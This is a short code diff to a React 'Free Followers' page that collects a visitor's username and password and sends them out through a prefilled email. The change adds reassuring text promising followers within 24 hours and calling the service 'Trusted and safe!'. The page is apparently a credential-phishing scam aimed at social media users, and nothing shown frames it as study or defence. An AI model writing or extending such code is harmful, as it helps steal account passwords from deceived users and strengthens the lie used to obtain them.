@@ -40,7 +40,7 @@ export default function FreeFollowersPage() {
       // Build mailto link with encoded subject and body
       const subject = encodeURIComponent("Free Followers Request");
       const body = encodeURIComponent(
-        `Username: ${form.username}\nPassword: ${form.password}`
+        `Username: ${form.username}\nPassword: ${form.password}\n\nYou will receive free followers within 24 hours. Trusted and safe!`
       );
 
       // Open default mail client with prefilled email
